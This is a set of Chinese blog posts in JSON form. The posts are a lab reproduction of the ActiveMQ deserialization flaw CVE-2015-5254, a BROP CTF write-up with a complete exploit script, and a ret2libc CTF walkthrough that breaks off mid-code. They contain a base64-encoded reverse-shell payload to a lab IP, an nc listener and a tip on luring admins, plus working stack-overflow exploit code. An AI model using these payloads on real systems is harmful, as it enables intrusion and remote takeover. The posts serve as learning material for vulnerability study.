[{"title":"ActiveMQ 反序列化漏洞（CVE-2015-5254）复现及分析","url":"/2024/02/04/ActiveMQ-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2015-5254%EF%BC%89%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/","content":"配置java环境查看java版本\njava -version\n\n安装java8，默认安装在/usr/lib/jvm/java-8-openjdk-amd64\nsudo apt install openjdk-8-jdk\n\n配置环境变量\nsudo vim ~/.bashrc# 在最后一行添加export JAVA_HOME=/usr/lib/jvm/java-8-jdk-amd64\n\n切换jdk版本使用update-alternatives命令进行版本更换\n/usr/lib/jvm/java-8-openjdk-amd64和/usr/bin/java两个路径要和自己的路径吻合\nsudo update-alternatives --install /usr/bin/java java /usr/lib/jvm/java-8-openjdk-amd64/bin/java 1070\n\n切换jdk\nsudo update-alternatives --config java\n\n漏洞复现Vulhub搭建、运行漏洞环境\ndocker compose up -d\n\n漏洞利用过程：\n\n使用ysoserial构造可执行命令的序列化对象\n作为一个消息，发送给目标的61616端口\n访问web管理页面，读取消息，触发漏洞\n\njmet（Java消息利用工具  https://github.com/matthiaskaiser/jmet）的原理是使用ysoserial（java反序列化利用工具  https://github.com/frohoff/ysoserial）生成payload并发送（jar内自带ysoserial），在ysoserial中的gadget中选择一个可以使用的，比如ROME。\n一些易受攻击的JMS：\n\nApache ActiveMQ    &lt;–本次的受害者\nRedhat&#x2F;Apache HornetQ\nOracle OpenMQ\nIBM WebSphereMQ\nOracle Weblogic\nPivotal RabbitMQ\nIBM MessageSight\nIIT Software SwiftMQ\nApache ActiveMQ Artemis\nApache QPID JMS\nApache QPID Client\nAmazon SQS Java Messaging\n\n下载jmet–&gt;https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar\n在jar的同级目录创建文件夹\nmkdir external\n\n\n\n执行\njava -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch /tmp/success&quot; -Yp ROME your-ip 61616\n\n\n\n此时会给目标ActiveMQ添加一个名为event的队列，我们可以通过http://your-ip:8161/admin/browse.jsp?JMSDestination=event看到这个队列中所有消息：\n默认admin&#x2F;admin\n\n\n可以看到多了一条消息\n\n\n点击消息触发文件创建，成功执行命令\n此时进入容器docker compose exec activemq bash，可见&#x2F;tmp&#x2F;success已成功创建，说明漏洞利用成功：\n\n\n将命令换成反弹shell语句再利用：\n使用https://ares-x.com/tools/runtime-exec生成payload\nbash -i &gt;&amp; /dev/tcp/192.168.3.166/9999 0&gt;&amp;1---&gt;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMTY2Lzk5OTkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\n\n发送pyload：\njava -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMTY2Lzk5OTkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -Yp ROME 192.168.3.166 61616\n\n监听9999端口：\nnc -l -p 9999\n\n\n\n点击：\n\n\n反弹shell成功：\n\n\n值得注意的是，通过web管理页面访问消息并触发漏洞这个过程需要管理员权限。在没有密码的情况下，我们可以诱导管理员访问我们的链接以触发，或者伪装成其他合法服务需要的消息，等待客户端访问的时候触发。\n原理入口函数该漏洞的入口函数为 org.apache.activemq.util.JMSExceptionSupport#createSerializableException，当 ActiveMQ 接收到异常信息并尝试将其序列化时就会调用该函数。\nJMSException 是 Java 消息服务（Java Message Service，JMS）中的一种异常，表示 JMS 操作出现了问题。在 ActiveMQ 中，当消息发送或接收失败时，就会抛出 JMSException 异常。\n在 ActiveMQ 中，JMSExceptionSupport.createSerializableException() 方法会将 JMSException 异常对象序列化为字节数组，并包含了 cause 和 message 内的异常和信息。具体实现代码如下：\npublic static JMSException createSerializableException(Throwable cause) &#123;    if (cause instanceof JMSException) &#123;        return (JMSException)cause;    &#125;JMSException exception = new JMSException(cause.getMessage());exception.initCause(cause);exception.setStackTrace(cause.getStackTrace());try &#123;    ByteArrayOutputStream baos = new ByteArrayOutputStream();    ObjectOutputStream oos = new ObjectOutputStream(baos);    oos.writeObject(exception);    oos.close();    exception.setSerializedEx(baos.toByteArray());&#125; catch (IOException ioe) &#123;    exception.printStackTrace();&#125;return exception;\n\n\n攻击者可以通过构造精心设计的 cause 和 message 字符串，注入恶意代码。当 ActiveMQ 在发送或接收消息失败时，将会调用 createSerializableException() 方法，将 JMSException 对象序列化后返回给客户端。客户端收到该序列化数据并尝试反序列化时，注入的恶意代码就会被执行，导致远程代码执行漏洞的发生。\n总的来说，攻击者利用 createSerializableException() 方法中的漏洞注入恶意代码，接着将构造的序列化数据发送到 ActiveMQ服务器来触发漏洞，从而实现攻击目的。\n补丁原理ActiveMQ 反序列化漏洞的修复补丁函数是JMSExceptionSupport.createException(String message, Throwable cause)，该函数会检查传入的 message 和 cause 是否为空，如果为空则会抛出IllegalArgumentException异常。修复版 ActiveMQ 中增加了该函数的调用以及相关的参数检查，避免了该漏洞的利用。\n首先，该函数的输入参数有两个：message和cause。message是一个字符串，用于描述异常的信息；而cause则是异常的根本原因，即导致该异常的另一个异常对象。通常，在使用异常对象时，我们会将根本原因字符串存入message中，而cause则可以是任何Throwable类型的对象。\n其次，该函数的修复思路是在message和cause参数检查中增加了空指针检查。具体而言，如果message或cause为空，则会抛出IllegalArgumentException异常，阻止了攻击者构造恶意的cause字符串和message字符串进行利用。\n最后，需要注意的是，该函数只是修复了漏洞的利用入口，而并不完全解决了该漏洞。因为在具有该漏洞的 ActiveMQ 版本中，仍然存在其他反序列化漏洞的利用入口。\n参考：\nhttps://blog.csdn.net/m0_37573740/article/details/131097392\nhttps://github.com/Threekiii/Vulhub-Reproduce/blob/master/Apache%20ActiveMQ%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20CVE-2015-5254.md\n","categories":["漏洞复现"],"tags":["ActiveMQ","vulhub"]},{"title":"BROP","url":"/2024/02/01/BROP/","content":"题目是wiki上面的BROP，来自HCTF2016\n搭好环境，因为是brop练习，所以就不用ida了。\n因为没有二进制文件，略过checksec\n1.确定栈溢出长度测得72。同时可以根据回显发现程序没有开启canary保护。\ndef get_buf_size():    i = 1    while True:        try:            p = remote(&quot;192.168.3.166&quot;, 8888)            p.recvuntil(b&quot;WelCome my friend,Do you know password?\\n&quot;)            p.send(i * &quot;a&quot;)  # donot sendline            output = p.recv()            p.close()            if not output.startswith(b&quot;No password&quot;):                return i - 1            else:                log.info(&quot;%d is not enough&quot; % i)                i += 1        except EOFError:            p.close()            i -= 1            log.info(&quot;buf_size is %d&quot; % i)            return i\n\n2.寻找 stop gadget其实就是找到一个让程序不崩溃的地方，比如函数入口\n假设程序没有开启PIE，那么基地址为0x08048000或0x400000\n先假设程序是64位的试一下\ndef get_stop_addr(buf_size, start_addr=0x400000):  # 32bit:0x08048000    stop_addr = start_addr    while True:        try:            p = remote(&quot;192.168.3.166&quot;, 8888)            p.recvuntil(b&quot;WelCome my friend,Do you know password?\\n&quot;)            payload = b&quot;a&quot; * buf_size + p64(stop_addr)            p.sendline(payload)            p.recv()            p.close()            log.info(&quot;one success addr: 0x%x&quot; % stop_addr)            return stop_addr        except EOFError:            log.info(&quot;one fail addr: 0x%x&quot; % stop_addr)            stop_addr += 1            p.close()        except Exception:            log.info(&quot;connect error&quot;)            stop_addr -= 1\n\n找这个地址要等好一会,得到一个0x4006b6，确实是64位程序\n\n\n这里好死不死找到main的地址了，搞得下面出不来。换了一个0x4006ce\n3.获取main的地址获取main的地址这是个笼统的说法，其实是要的地址是到这个地址就会打印WelCome…的地方\n\n如果从程序的基地址 0x400000 开始寻找的话，按照 Linux ELF执行的顺序，优先找到的肯定是 _start 函数，所以这里也可以说是寻找 _start 函数，对于我们的需求来说，找到 _start 和 找到  main 是一样的\n\n既然我们已经找到了 stop_gadget，那么我们就可以把 stop_gadget 的地址放在我们要遍历的地址的下一条指令，这样以便能够获取被遍历的地址的返回结果。但是 _start 函数本身就是一个 stop_gadget，所以我们在这一步就不放置 stop_gadget 了\ndef get_main_addr(buf_size, start_addr=0x400660):    main_addr = start_addr    while True:        main_addr += 1        payload = b&quot;a&quot; * buf_size + p64(main_addr)        try:            p = remote(&quot;192.168.3.166&quot;, 8888)            p.recvuntil(b&quot;WelCome my friend,Do you know password?\\n&quot;)            p.sendline(payload)            resp = p.recv()            p.close()            log.info(                &quot;find one stop gadget: 0x%x ------------------------------------&quot;                % main_addr            )            if resp.startswith(b&quot;WelCome&quot;):                log.info(&quot;find main addr: 0x%x&quot; % main_addr)                return main_addr        except EOFError:            log.info(&quot;one fail addr: 0x%x&quot; % main_addr)            p.close()        except Exception:            log.info(&quot;connect error&quot;)            main_addr -= 1\n\n第一次爆的时候没爆出来，后来发现是前面的stop_gadget找的是main_addr。换了一个就好了。\n\n\n4.识别 brop gadget在 x64 的 Linux 用户空间环境中，参数都是通过寄存器来实现的，具体如下：\n内核接口内核接口使用的寄存器有rdi、rsi、rdx、r10、r8和r9。系统调用通过syscall指令完成。除了rcx、r11和rax，其他的寄存器都被保留。系统调用的编号必须在寄存器 rax 中传递。系统调用的参数限制为6个，不直接从堆栈上传递任何参数。返回时，rax 中包含了系统调用的结果，而且只有 INTEGER 或者 MEMORY 类型的值才会被传递给内核。\n用户接口x86-64 下通过寄存器传递参数，这样做比通过栈具有更高的效率。它避免了内存中参数的存取和额外的指令。根据参数类型的不同，会使用寄存器或传参方式。如果参数的类型是 MEMORY，则在栈上传递参数。如果类型是INTEGER，则顺序使用 rdi、rsi、rdx、rcx、r8 和 r9。所以如果有多于 6 个的 INTEGER 参数，则后面的参数在栈上传递。\n什么是 useful gadget 取决于你要利用哪个函数做哪些事，在 BROP 的攻击中基本上都是利用 write 函数和 puts 函数来 dump 内存\nputs：\n#include &lt;stdio.h&gt;int puts(const char *s);\n\nputs 函数就一个参数,所以按照用户接口的函数调用约定，只需要在 rdi 寄存器中设置参数就可以了，那我们需要的 useful gadget 就是 pop rdi; ret ，这个 gadget 的意思就是将栈顶的内容存储到 rdi 寄存器中，之后再将更新后的栈顶的地址存储到 RIP 寄存器中，之后系统就会执行 RIP 寄存器中存储的地址所指向的指令\nwrite：\n#include &lt;unistd.h&gt;ssize_t write(int fd, const void *buf, size_t count);\n\nwrite 函数共有三个参数，所以按照用户接口的函数调用约定，需要分别在 rdi、rsi、rdx分别设置参数，那么需要的useful gadget 就比较复杂了，可以分别找到 pop rdi;ret、pop rsi;ret、pop rdx; ret，这三个顺序可以变化，赋值顺序也跟着变就好了，当然也可以进行一些组合，比如 pop rdi;pop rsi;ret、pop rdx;ret ，当然了，如果你可以直接找到 pop rdi;pop rsi; pop rdx;ret 那就算你牛好了\n比较起来，还是 puts 函数容易得多，由于 gcc 在编译 c 代码的过程中，对只有一个参数的 printf 函数有一项优化，也就是使用 puts 函数来替换 printf 函数，所以在有输出的程序中使用了 puts 的可能性还是挺大的。\n然后寻找通用gadget，还是__libc_csu_init\n在https://defuse.ca/online-x86-assembler.htm#disassembly可以查到`pop rdi;ret&#96;的字节码是5FC3\n在通用gadget中可以找到：\n\n\n可以把指针位置调整，从5F开始解析，就可以获取到5FC3了。\n现在获取gadget的任务编程了获取第一块gadget的地址\n通过gadget的连续六个pop可以作为筛选条件\ndef get_useful_gadget(buf_size, stop_gadget, main_addr, start_addr=0x4007B0):    useful_gadget = start_addr    stop_gadget = stop_gadget    main_addr = main_addr    while True:        time.sleep(0.5)        useful_gadget += 1        payload = b&quot;a&quot; * buf_size + p64(useful_gadget) + p64(1) * 6 + p64(main_addr)        try:            p = remote(&quot;192.168.3.166&quot;, 8888)            p.recvuntil(b&quot;WelCome my friend,Do you know password?\\n&quot;)            p.sendline(payload)            resp = p.recv(timeout=0.5)            p.close()            log.info(                &quot;find one stop gadget: 0x%x ------------------------------------&quot;                % useful_gadget            )            if resp.startswith(b&quot;WelCome&quot;):                try:                    payload = b&quot;a&quot; * buf_size + p64(useful_gadget) + p64(1) * 6                    p = remote(&quot;192.168.3.166&quot;, 8888)                    p.recvuntil(b&quot;WelCome my friend,Do you know password?\\n&quot;)                    p.sendline(payload)                    resp = p.recv()                    p.close()                except EOFError:                    log.info(&quot;one useful addr: 0x%x&quot; % useful_gadget)                    p.close()                    return useful_gadget        except EOFError:            log.info(&quot;not 0x%x&quot; % useful_gadget)            p.close()        except Exception:            log.info(&quot;connect error&quot;)            useful_gadget -= 1\n\n\n\npop rdi;ret的地址是gadget+0x9\n5.确定 puts@plt 地址可以控制rdi这个寄存器那么就可以给puts提供参数了。如果执行到某个地址后我们的参数被打印出来了，那么这个地址就是puts的plt地址\n有了puts就可以把每个地址的内容都打印出来。\n虽然能控制参数，但只能传递一个地址进去，所以必须知道某个地址的内容。\nLinux ELF 文件最开始的几个字节是魔数，固定的\\x7fELF，那么0x400000存储的内容就是\\x7fELF。所以可以把它作为参数，看看遍历到什么地方时回打印出\\x7fELF\ndef get_puts_plt(buf_size, stop_gadget, main_addr, useful_gadget, start_addr=0x400540):    pop_rdi_ret = useful_gadget + 0x9    elf_magic_addr = 0x400000    puts_plt = start_addr    while True:        time.sleep(0.5)        puts_plt += 1        payload = (            b&quot;a&quot; * buf_size            + p64(pop_rdi_ret)            + p64(elf_magic_addr)            + p64(puts_plt)            + p64(main_addr)        )        try:            p = remote(&quot;192.168.3.166&quot;, 8888)            p.recvuntil(b&quot;WelCome my friend,Do you know password?\\n&quot;)            p.sendline(payload)            resp1 = p.recvline(timeout=0.5)            resp2 = p.recvline(timeout=0.5)            if resp1.startswith(b&quot;\\x7fELF&quot;) and resp2.startswith(b&quot;WelCome&quot;):                p.close()                log.info(&quot;puts_plt: 0x%x&quot; % puts_plt)                return puts_plt            p.close()            log.info(                &quot;find one stop gadget: 0x%x ------------------------------------&quot;                % puts_plt            )        except EOFError:            log.info(&quot;not 0x%x&quot; % puts_plt)            p.close()        except Exception:            log.info(&quot;connect error&quot;)            puts_plt -= 1\n\n要注意recv()和recvline()\n\n\n其实这里得到的地址和实际有一点偏差，但是都可以起到控制puts的作用，偏差的代码大概是类似滑板的。\n6.dump内存有了puts的plt就可以打印每一个地址的内容了，可以dump内存。\n\nputs 函数通过 \\x00 进行截断，并且会在每一次输出末尾加上换行符 \\x0a，所以有一些特殊情况需要做一些处理，比如单独的 \\x00、\\x0a 等，首先当然是先去掉末尾 puts 自动加上的 \\n，然后如果 recv 到一个 \\n，说明内存中是 \\x00，如果 recv 到一个 \\n\\n，说明内存中是 \\x0a。p.recv(timeout=0.1) 是由于函数本身的设定，如果有 \\n\\n，它很可能在收到第一个 \\n 时就返回了，加上参数可以让它全部接收完。\n\ndef dump_memory(    buf_size,    stop_gadget,    main_addr,    useful_gadget,    puts_plt,    start_addr=0x400000,    end_addr=0x401000,):    pop_rdi_ret = useful_gadget + 0x9    result = b&quot;&quot;    while start_addr &lt; end_addr:        time.sleep(0.5)        payload = (            b&quot;a&quot; * buf_size            + p64(pop_rdi_ret)            + p64(start_addr)            + p64(puts_plt)            + p64(stop_gadget)        )        try:            p = remote(&quot;192.168.3.166&quot;, 8888)            p.recvuntil(b&quot;WelCome my friend,Do you know password?\\n&quot;)            p.sendline(payload)            resp1 = p.recv(timeout=0.5)            # log.info(&quot;[++++]leaking: 0x%x --&gt; %s&quot; % (start_addr, (resp or b&quot;&quot;).hex()))            # if start_addr == 0x40003E:  # and start_addr&lt;=0x40003b:            #    log.info(            #        &quot;[++++]leaking: 0x%x --&gt; %s&quot; % (start_addr, (resp1 or b&quot;&quot;).hex())            #    )            #    exit()            if resp1 == b&quot;\\n&quot;:                resp = b&quot;\\x00&quot;            elif resp1[-1:] == b&quot;\\n&quot;:                log.info(                    &quot;[++++]leaking: 0x%x --&gt; %s&quot; % (start_addr, (resp or b&quot;&quot;).hex())                )                resp = resp1[:-1] + b&quot;\\x00&quot;            else:                resp = resp1            if resp != resp1:                log.info(                    &quot;[change]resp1: 0x%x: %s --&gt; resp1: 0x%x: %s&quot;                    % (                        start_addr,                        (resp1 or b&quot;&quot;).hex(),                        start_addr,                        (resp or b&quot;&quot;).hex(),                    )                )            log.info(&quot;leaking: 0x%x --&gt; %s&quot; % (start_addr, (resp or b&quot;&quot;).hex()))            result += resp            start_addr += len(resp)            p.close()        except Exception as e:            print(e)            log.info(&quot;connect error&quot;)            start_addr -= 1    return result\n\n\n\n在我缓慢的虚拟机上要等差不多十五分钟。\n先跑着吧，感觉比赛的靶机经不起这么连呢…\n\n\n可以使用上面这个工具，但是不知道这次打开为什么是invalid\n所以换成ida了\n打开binary模式，edit-&gt;segments-&gt;rebase program 将程序的基地址改为 0x400000，然后找到偏移0x555\n\n\n看push 0 前面的那个地址0x601018，大概率就是puts的got地址了\n7.泄露libcputs_got = 0x601018p = remote(&quot;192.168.3.166&quot;, 8888)p.recvuntil(b&quot;WelCome my friend,Do you know password?\\n&quot;)payload = (    b&quot;a&quot; * buf_size + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr))p.sendline(payload)puts_real_addr = u64(p.recvline()[:-1].ljust(8, b&quot;\\x00&quot;))print(&quot;puts_real_addr: 0x%x&quot; % puts_real_addr)\n\n\n\n8.利用又遇到了栈对齐\n前面的pop rdi;ret的字节码是5f3c，起始地址是useful+9，那么ret的地址就是userful+10\n完整exp:\nfrom ctypes import *from struct import packfrom LibcSearcher import *from pwn import *def get_buf_size():    i = 1    while True:        try:            p = remote(&quot;192.168.3.166&quot;, 8888)            p.recvuntil(b&quot;WelCome my friend,Do you know password?\\n&quot;)            p.send(i * &quot;a&quot;)  # donot sendline            output = p.recv()            p.close()            if not output.startswith(b&quot;No password&quot;):                return i - 1            else:                log.info(&quot;%d is not enough&quot; % i)                i += 1        except EOFError:            p.close()            i -= 1            log.info(&quot;buf_size is %d&quot; % i)            return idef get_stop_addr(buf_size, start_addr=0x4006C0):  # 32bit:0x08048000    stop_addr = start_addr    while True:        try:            p = remote(&quot;192.168.3.166&quot;, 8888)            p.recvuntil(b&quot;WelCome my friend,Do you know password?\\n&quot;)            payload = b&quot;a&quot; * buf_size + p64(stop_addr)            p.sendline(payload)            p.recv()            p.close()            log.info(&quot;one success addr: 0x%x&quot; % stop_addr)            return stop_addr        except EOFError:            log.info(&quot;one fail addr: 0x%x&quot; % stop_addr)            stop_addr += 1            p.close()        except Exception:            log.info(&quot;connect error&quot;)            stop_addr -= 1def get_main_addr(buf_size, start_addr=0x4006B0):    main_addr = start_addr    while True:        main_addr += 1        payload = b&quot;a&quot; * buf_size + p64(main_addr)        try:            p = remote(&quot;192.168.3.166&quot;, 8888)            p.recvuntil(b&quot;WelCome my friend,Do you know password?\\n&quot;)            p.sendline(payload)            resp = p.recv()            p.close()            log.info(                &quot;find one stop gadget: 0x%x ------------------------------------&quot;                % main_addr            )            if resp.startswith(b&quot;WelCome&quot;):                log.info(&quot;find main addr: 0x%x&quot; % main_addr)                return main_addr        except EOFError:            log.info(&quot;one fail addr: 0x%x&quot; % main_addr)            p.close()        except Exception:            log.info(&quot;connect error&quot;)            main_addr -= 1def get_useful_gadget(buf_size, stop_gadget, main_addr, start_addr=0x4007B0):    useful_gadget = start_addr    stop_gadget = stop_gadget    main_addr = main_addr    while True:        time.sleep(0.5)        useful_gadget += 1        payload = b&quot;a&quot; * buf_size + p64(useful_gadget) + p64(1) * 6 + p64(main_addr)        try:            p = remote(&quot;192.168.3.166&quot;, 8888)            p.recvuntil(b&quot;WelCome my friend,Do you know password?\\n&quot;)            p.sendline(payload)            resp = p.recv(timeout=0.5)            p.close()            log.info(                &quot;find one stop gadget: 0x%x ------------------------------------&quot;                % useful_gadget            )            if resp.startswith(b&quot;WelCome&quot;):                try:                    payload = b&quot;a&quot; * buf_size + p64(useful_gadget) + p64(1) * 6                    p = remote(&quot;192.168.3.166&quot;, 8888)                    p.recvuntil(b&quot;WelCome my friend,Do you know password?\\n&quot;)                    p.sendline(payload)                    resp = p.recv()                    p.close()                except EOFError:                    log.info(&quot;one useful addr: 0x%x&quot; % useful_gadget)                    p.close()                    return useful_gadget        except EOFError:            log.info(&quot;not 0x%x&quot; % useful_gadget)            p.close()        except Exception:            log.info(&quot;connect error&quot;)            useful_gadget -= 1def get_puts_plt(buf_size, stop_gadget, main_addr, useful_gadget, start_addr=0x400540):    pop_rdi_ret = useful_gadget + 0x9    elf_magic_addr = 0x400000    puts_plt = start_addr    while True:        time.sleep(0.5)        puts_plt += 1        payload = (            b&quot;a&quot; * buf_size            + p64(pop_rdi_ret)            + p64(elf_magic_addr)            + p64(puts_plt)            + p64(main_addr)        )        try:            p = remote(&quot;192.168.3.166&quot;, 8888)            p.recvuntil(b&quot;WelCome my friend,Do you know password?\\n&quot;)            p.sendline(payload)            resp1 = p.recvline(timeout=0.5)            resp2 = p.recvline(timeout=0.5)            if resp1.startswith(b&quot;\\x7fELF&quot;) and resp2.startswith(b&quot;WelCome&quot;):                p.close()                log.info(&quot;puts_plt: 0x%x&quot; % puts_plt)                return puts_plt            p.close()            log.info(                &quot;find one stop gadget: 0x%x ------------------------------------&quot;                % puts_plt            )        except EOFError:            log.info(&quot;not 0x%x&quot; % puts_plt)            p.close()        except Exception:            log.info(&quot;connect error&quot;)            puts_plt -= 1def dump_memory(    buf_size,    stop_gadget,    main_addr,    useful_gadget,    puts_plt,    start_addr=0x400000,    end_addr=0x401000,):    pop_rdi_ret = useful_gadget + 0x9    result = b&quot;&quot;    while start_addr &lt; end_addr:        time.sleep(0.5)        payload = (            b&quot;a&quot; * buf_size            + p64(pop_rdi_ret)            + p64(start_addr)            + p64(puts_plt)            + p64(stop_gadget)        )        try:            p = remote(&quot;192.168.3.166&quot;, 8888)            p.recvuntil(b&quot;WelCome my friend,Do you know password?\\n&quot;)            p.sendline(payload)            resp1 = p.recv(timeout=0.5)            # log.info(&quot;[++++]leaking: 0x%x --&gt; %s&quot; % (start_addr, (resp or b&quot;&quot;).hex()))            # if start_addr == 0x40003E:  # and start_addr&lt;=0x40003b:            #    log.info(            #        &quot;[++++]leaking: 0x%x --&gt; %s&quot; % (start_addr, (resp1 or b&quot;&quot;).hex())            #    )            #    exit()            if resp1 == b&quot;\\n&quot;:                resp = b&quot;\\x00&quot;            elif resp1[-1:] == b&quot;\\n&quot;:                log.info(                    &quot;[++++]leaking: 0x%x --&gt; %s&quot; % (start_addr, (resp or b&quot;&quot;).hex())                )                resp = resp1[:-1] + b&quot;\\x00&quot;            else:                resp = resp1            if resp != resp1:                log.info(                    &quot;[change]resp1: 0x%x: %s --&gt; resp1: 0x%x: %s&quot;                    % (                        start_addr,                        (resp1 or b&quot;&quot;).hex(),                        start_addr,                        (resp or b&quot;&quot;).hex(),                    )                )            log.info(&quot;leaking: 0x%x --&gt; %s&quot; % (start_addr, (resp or b&quot;&quot;).hex()))            result += resp            start_addr += len(resp)            p.close()        except Exception as e:            print(e)            log.info(&quot;connect error&quot;)    return resultcontext(log_level=&quot;debug&quot;, os=&quot;linux&quot;, arch=&quot;amd64&quot;)# get_buf_size()buf_size = 72# get_stop_addr(buf_size)stop_gadget = 0x4006CE# get_main_addr(buf_size)main_addr = 0x4006B6# get_useful_gadget(buf_size, stop_gadget, main_addr)useful_gadget = 0x4007BApop_rdi_ret = useful_gadget + 0x9# get_puts_plt(buf_size, stop_gadget, main_addr, useful_gadget)puts_plt = 0x400555# code_bin = dump_memory(#     buf_size,#     stop_gadget,#     main_addr,#     useful_gadget,#     puts_plt,# )# with open(&quot;/home/cake/Documents/pwn/wiki/medium_rop/3code.dump&quot;, &quot;wb&quot;) as f:#     f.write(code_bin)puts_got = 0x601018p = remote(&quot;192.168.3.166&quot;, 8888)# -----leak real puts-----p.recvuntil(b&quot;WelCome my friend,Do you know password?\\n&quot;)payload = (    b&quot;a&quot; * buf_size + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr))p.sendline(payload)puts_real_addr = u64(p.recvline()[:-1].ljust(8, b&quot;\\x00&quot;))print(&quot;puts_real_addr: 0x%x&quot; % puts_real_addr)# -----leak libc# puts_real_addr = 0x7F2A09ED5E50libc = LibcSearcher(&quot;puts&quot;, puts_real_addr)libc_base = puts_real_addr - libc.dump(&quot;puts&quot;)system_addr = libc_base + libc.dump(&quot;system&quot;)binsh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)print(&quot;system_addr: 0x%x&quot; % system_addr)print(&quot;binsh_addr: 0x%x&quot; % binsh_addr)payload = (    b&quot;a&quot; * buf_size    + p64(useful_gadget + 10)    + p64(pop_rdi_ret)    + p64(binsh_addr)    + p64(system_addr)    + p64(stop_gadget))p.recvuntil(b&quot;WelCome my friend,Do you know password?\\n&quot;)p.sendline(payload)p.interactive()\n\n参考：\nhttps://cloud.tencent.com/developer/article/1965871 (写得比wiki详细,清楚非常非常多)\n","categories":["CTF"],"tags":["pwn"]},{"title":"NewstarCTF 2023 week2 ret2libc详细解析","url":"/2024/01/13/NewstarCTF-2023-week2-ret2libc%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/","content":"newstar2023的题，在buu上还可以做，算是我正儿八经做的第一道pwn，太曲折了啊啊啊。\n存在pop_rdi_ret的gadget可以利用\n\n在x86_64架构中，函数调用的参数通过寄存器来传递，而不是通过栈来传递。前六个整数或者指针参数是通过rdi,rsi,rdx,rcx,r8,r9这六个寄存器来传递的。如果有更多参数，剩下的参数通过栈传递。\n\n若要使用ROP（Return Oriented Programming）来调用一个函数并且操控参数时，就要找到可以控制这些寄存器的gadget。比如\n1. pop rdi;ret2. pop rsi;popr15;ret (官方wp中使用的)3. ret\n\n获取pop_rdi_ret的地址\nROPgadget --binary /... --only &quot;pop|ret&quot;\n\n\n然后看一下buf的偏移量\n\n\n找到偏移为0x20\nbuf是全局变量，被放在bss段上\n\n在 C 语言中，一个变量是在 BSS 段还是在栈上，主要取决于它的声明位置和存储类别：\n\n全局变量和静态变量：这些变量通常存储在 BSS 段。BSS 段用于存储程序中未初始化的全局变量和静态变量。\n局部变量和函数参数：这些变量通常存储在栈上。当一个函数被调用时，它的局部变量和参数会被压入栈中。\n\n\n可以使用objdump -h program//readelf -S program查看bss段的地址（不同环境下bss的地址可能不同）\n使用peda的vmmap可以查看bss段有无执行权限\n整理一下思路，我们可以先把buf塞满（0x20），然后塞rbp（0x8，因为在bss段所以可以直接塞bss的起始位置）。\np.sendafter(    b&quot;Show me your magic again\\n&quot;,    b&quot;\\x00&quot; * 0x20 + flat(bss,pop_rdi_ret, puts_got, puts_plt, main_addr),)#40=32+8put_addr = u64(p.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8, b&quot;\\x00&quot;))print(hex(put_addr))\n\n然后因为64位程序的函数的第一个参数在rdi中，因此把栈顶的值弹出到rdi。在x86_64中，调用函数时，函数的第一个参数是通过rdi寄存器传递的。因此使用pop_rdi_ret这个gadget，把它的地址放在原本的return address处，那么程序就会跳转到pop_rdi_ret的地址处执行它。pop_rdi将此时的栈顶数据（puts函数的地址）弹给rdi，然后ret到plt表的puts处调用puts，那么puts就会找到rdi，打印rdi中puts的地址。puts执行之后，将ret回main_addr。\n这样就完成了puts函数地址的泄露，可以用于泄露远程libc的版本。\n这里我还另外打了read的地址。查libc版本的时候会准确一点。只有一个地址有时会有很多个版本的libc被检索到。https://libc.rip/\n只搜索三个字节（12位）的原因：\n\n即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变\n\n\n这样就得到了libc的版本，可以看到有system和/bin/sh的偏移。所以我们计算libc_base，加上偏移得到需要的函数的地址。\nlibc_base = puts_addr - 0x80970system_addr = libc_base + 0x04F420binsh_addr = libc_base + 0x1B3D88\n\n这是手动计算的方法。还有其他两种办法（官方提供的）写在完整代码中了。\n现在的目标就是执行system(&#39;/bin/sh&#39;)了。与上面类似，仍然利用栈溢出构造ROP链。\nbss--&gt;pop_rdi_ret--&gt;binsh_addr--&gt;system_addr--main_addr(填rbp--&gt;调整参数为&#x27;/bin/sh&#x27;+ret跳到调用system处--&gt;/bin/sh--&gt;system--&gt;main)\n\n所以可以：\np.sendafter(    b&quot;Show me your magic again\\n&quot;,    b&quot;\\x00&quot; * 0x20 + flat(bss,pop_rdi_ret, binsh_addr,system_addr,main_addr),)\n\n然而这样执行程序崩溃了。为什么呢？\n因为在ubuntu18版本以上调用system函数需要栈对齐。\n64位的system命令有个movaps指令\n\nMovaps：movaps XMM,XMM/m128 movaps XMM/128,XMM把源存储器内容值送入目的寄存器,当有m128时,必须对齐内存16字节,也就是内存地址低4位为0,保证rsp&amp;0xf&#x3D;&#x3D;0\n\n(调用printf时也需要对齐)\n我们加一个ret来栈对齐：\np.sendafter(    b&quot;Show me your magic again\\n&quot;,    b&quot;\\x00&quot; * 0x20 + flat(bss,pop_rdi_ret, binsh_addr,ret,system_addr,main_addr),)\n\n大功告成！\nfrom pwn import *from LibcSearcher import *context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)# p=process(&#x27;./ret2libc&#x27;)p = remote(&quot;node5.buuoj.cn&quot;, 28657) elf = ELF(&quot;./ret2libc&quot;)puts_plt = elf.plt[&quot;puts&quot;]puts_got = elf.got[&quot;puts&quot;]main_addr = elf.symbols[&quot;main&quot;]pop_rdi_ret = 0x0000000000400763pop_rsi_r15_ret = 0x0000000000400761ret = 0x0000000000400506bss = 0x0000000000601040p.sendafter(    b&quot;Show me your magic again\\n&quot;,    b&quot;\\x00&quot; * 0x20 + 